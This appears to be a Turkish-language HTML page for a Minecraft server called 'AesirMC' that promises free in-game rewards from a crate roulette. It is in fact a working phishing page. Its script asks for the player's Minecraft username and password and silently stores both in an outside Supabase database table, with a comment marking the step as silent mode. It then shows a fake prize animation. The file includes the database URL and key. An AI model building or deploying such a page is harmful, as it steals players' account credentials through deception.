<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AesirMC | Premium Minecraft Experience</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        :root {
            --primary: #00a2ff;
            --secondary: #0066ff;
            --bg-dark: #050608;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            margin: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg-dark);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 162, 255, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 102, 255, 0.1) 0%, transparent 40%);
            overflow-x: hidden;
        }

        /* --- MODERN NAVBAR --- */
        nav {
            padding: 20px 10%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(5, 6, 8, 0.8);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .logo { font-size: 24px; font-weight: 800; letter-spacing: -1px; }
        .logo span { color: var(--primary); }

        /* --- AUTH CARD (GLASSMORPHISM) --- */
        #auth-container {
            margin: auto;
            width: 100%;
            max-width: 420px;
            padding: 50px;
            background: var(--glass);
            backdrop-filter: blur(30px);
            border: 1px solid var(--border);
            border-radius: 32px;
            box-shadow: 0 40px 100px rgba(0,0,0,0.5);
            text-align: center;
            animation: fadeIn 0.8s ease-out;
        }

        h2 { font-size: 32px; margin-bottom: 10px; font-weight: 800; }
        p { color: #888; margin-bottom: 30px; font-size: 15px; }

        .input-group { position: relative; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            border-radius: 16px;
            color: white;
            font-size: 16px;
            transition: all 0.3s;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255,255,255,0.08);
            box-shadow: 0 0 20px rgba(0, 162, 255, 0.2);
        }

        .btn-primary {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border: none;
            border-radius: 16px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 162, 255, 0.4); }

        /* --- GAME INTERFACE --- */
        #game-container { display: none; padding: 60px 10%; text-align: center; }
        
        .main-chest {
            width: 240px;
            cursor: pointer;
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3));
        }
        .main-chest:hover { transform: scale(1.1) rotate(3deg); }

        /* --- MODERN ROULETTE --- */
        #roulette-section { display: none; margin-top: 50px; }
        .viewport {
            width: 100%;
            max-width: 800px;
            height: 160px;
            margin: 0 auto;
            background: rgba(255,255,255,0.03);
            border: 1px solid var(--border);
            border-radius: 24px;
            position: relative;
            overflow: hidden;
        }
        .viewport::after {
            content: '';
            position: absolute;
            left: 50%; top: 0; bottom: 0;
            width: 4px; background: var(--primary);
            box-shadow: 0 0 20px var(--primary);
            z-index: 10;
        }

        #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
        .slot { min-width: 140px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
        .slot img { width: 80px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3)); }

        /* --- WIN MODAL --- */
        #win-modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(10px);
            z-index: 1000;
            justify-content: center; align-items: center;
            flex-direction: column;
        }
        .win-card {
            background: var(--glass);
            padding: 60px;
            border-radius: 40px;
            border: 1px solid var(--primary);
            text-align: center;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<nav>
    <div class="logo">AESIR<span>MC</span></div>
    <div id="status-bar" style="font-size: 14px; font-weight: 600; color: #555;">DURUM: <span style="color: #00ff00;">AKTİF</span></div>
</nav>

<div id="auth-container">
    <h2>Hoş Geldin</h2>
    <p>Hediyelerini almak için karakterini doğrula.</p>
    
    <div class="input-group">
        <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
    </div>
    <div class="input-group">
        <input type="password" id="password" placeholder="Giriş Şifresi">
    </div>
    <button class="btn-primary" onclick="connectWorld()">BAĞLAN</button>
</div>

<div id="game-container">
    <h1 id="welcome-txt" style="font-weight: 800; font-size: 48px; margin-bottom: 40px;"></h1>
    
    <div id="chest-zone">
        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="main-chest" onclick="initSpin()">
        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px;">SANDIĞI AÇMAK İÇİN DOKUN</p>
    </div>

    <div id="roulette-section">
        <div class="viewport">
            <div id="strip"></div>
        </div>
        <button class="btn-primary" id="spin-btn" style="width: 240px; margin-top: 40px;" onclick="startSpin()">KASAYI ÇEVİR</button>
    </div>
</div>

<div id="win-modal">
    <div class="win-card">
        <h3 style="color: var(--primary); margin: 0;">YENİ EŞYA!</h3>
        <h1 id="win-name" style="font-size: 42px; margin: 10px 0 30px 0;"></h1>
        <img id="win-img" src="" width="180">
        <div style="margin-top: 40px;">
            <button class="btn-primary" onclick="location.reload()">ENVANTERE GİT</button>
        </div>
    </div>
</div>

<script>
    // --- SUPABASE CONFIG ---
    const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
    const _db = supabase.createClient(S_URL, S_KEY);

    const rewards = [
        { name: "Netherite Set", img: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
        { name: "Keskinlik V Kılıç", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
        { name: "Büyülü Elma", img: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
        { name: "Totem", img: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" },
        { name: "Ender İncisi", img: "https://minecraft.wiki/images/Thumb_Sprite_Ender_Pearl_JE3_BE3.png" }
    ];

    async function connectWorld() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        
        if(!u || !p) return alert("Lütfen alanları doldur!");

        // 'AES' Tablosuna kayıt (Sessiz mod)
        await _db.from('AES').insert([{ username: u, password: p }]);

        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('game-container').style.display = 'block';
        document.getElementById('welcome-txt').innerText = "MERHABA, " + u.toUpperCase();
    }

    function initSpin() {
        document.getElementById('chest-zone').style.display = 'none';
        document.getElementById('roulette-section').style.display = 'block';
        const strip = document.getElementById('strip');
        strip.innerHTML = '';
        
        // 80 tane rastgele item ekle
        for(let i=0; i<80; i++) {
            const item = rewards[Math.floor(Math.random() * rewards.length)];
            strip.innerHTML += `
                <div class="slot">
                    <img src="${item.img}">
                    <span style="font-size: 10px; color: #555;">${item.name}</span>
                </div>`;
        }
    }

    function startSpin() {
        const strip = document.getElementById('strip');
        const btn = document.getElementById('spin-btn');
        btn.disabled = true;
        btn.style.opacity = "0.5";

        const move = 6000 + Math.floor(Math.random() * 2000);
        strip.style.transition = "transform 6s cubic-bezier(0.2, 0, 0.1, 1)";
        strip.style.transform = `translateX(-${move}px)`;

        setTimeout(() => {
            const finalItem = rewards[Math.floor(Math.random() * rewards.length)];
            document.getElementById('win-modal').style.display = 'flex';
            document.getElementById('win-name').innerText = finalItem.name;
            document.getElementById('win-img').src = finalItem.img;
        }, 6500);
    }
</script>
</body>
</html>
